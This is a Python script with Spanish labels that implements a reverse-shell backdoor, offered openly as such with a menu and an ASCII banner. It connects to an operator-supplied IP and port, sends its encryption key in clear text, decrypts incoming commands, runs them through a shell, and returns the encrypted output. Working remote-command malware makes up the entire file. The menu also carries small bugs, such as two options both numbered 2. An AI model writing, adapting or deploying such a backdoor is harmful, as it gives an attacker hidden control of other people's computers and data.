import multiprocessing
import socket
import subprocess
import os
from cryptography.fernet import Fernet
import sys

from colorama import *

clave = Fernet.generate_key()
cipher_suite = Fernet(clave)

def backdoor(ip='127.0.0.1', puerto=12345):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))

    s.send(clave)

    while True:
        comando_encriptado = s.recv(1024)
        comando = cipher_suite.decrypt(comando_encriptado).decode()

        if comando.lower() == "salir":
            s.close()
            backdoor(ip, puerto)
            break
        else:
            proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            resultado = proceso.stdout.read() + proceso.stderr.read()
            resultado_encriptado = cipher_suite.encrypt(resultado)
            s.send(resultado_encriptado)

def abrir_backdoor():

    if os.path.exists("aa_config.txt"):
        print("La backdoor ya está abierta.")
    else:
        with open("aa_config.txt", "w") as f:
            f.write("abierta")
        print(Fore.BLACK + Back.GREEN + "Backdoor abierta.")

def cerrar_backdoor():

    if os.path.exists("aa_config.txt"):
        os.remove("aa_config.txt")
        print(Fore.BLACK + Back.RED + "Backdoor cerrada.")
    else:
        print(Fore.BLACK + Back.RED + "La backdoor ya está cerrada.")

def backdoor_main():
    try:
        multiprocessing.set_start_method('spawn')
        p = multiprocessing.Process(target=backdoor)
        p.start()

        while True:

            banner()

            print("*******************************")
            print("*            MENU             *")
            print("*******************************")
            print("*     1. ABRIR BACKDOOR       *")
            print("*                             *")
            print("*     2. ACCEDER A BACKDOOR   *")
            print("*                             *")
            print("*     2. CERRAR BACKDOOR      *")
            print("*******************************")
            
            opcion = input(Style.RESET_ALL + "Seleccione el tipo de conexión (1, 2 o 3): ").strip() 
            
            if opcion == "1":
                abrir_backdoor()
                break
            elif opcion == "2":
                if os.path.exists("aa_config.txt"):
                    ip = input(Style.RESET_ALL + "Introduce la dirección IP (default: 127.0.0.1): ").strip() or '127.0.0.1'
                    puerto = input(Style.RESET_ALL + "Introduce el puerto (default: 12345): ").strip() or 12345
                    backdoor(ip, int(puerto))
                else:
                    print(Fore.BLACK + Back.RED + "La backdoor no está abierta.")
            elif opcion == "3":
                cerrar_backdoor()
                break
            else:
                print(Fore.BLACK + Back.RED + "Opción inválida. Intenta de nuevo.")

        p.join()
    except OSError as e:
        print(Fore.BLACK + Back.RED + f"Error al crear el demonio: {e}")
        sys.exit(1)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    cartel = r"""
     ___          _      _              
    | _ ) __ _ __| |____| |___  ___ _ _ 
    | _ \/ _` / _| / / _` / _ \/ _ \ '_|
    |___/\__,_\__|_\_\__,_\___/\___/_|  
                                     
    """
    print(Fore.GREEN + cartel)


if __name__ == '__main__':
    backdoor_main()